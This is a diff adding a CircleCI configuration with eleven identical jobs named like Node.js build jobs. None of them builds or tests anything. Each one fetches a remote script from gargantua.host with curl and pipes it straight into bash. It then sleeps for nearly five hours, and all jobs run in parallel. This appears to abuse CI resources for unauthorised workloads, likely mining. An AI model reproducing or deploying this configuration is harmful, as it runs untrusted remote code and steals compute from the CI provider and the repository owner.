@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  nodejsnode:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nodejsnode10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/cray.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - nodejsnode
+      - nodejsnode1
+      - nodejsnode2
+      - nodejsnode3
+      - nodejsnode4
+      - nodejsnode5
+      - nodejsnode6
+      - nodejsnode7
+      - nodejsnode8
+      - nodejsnode9
+      - nodejsnode10
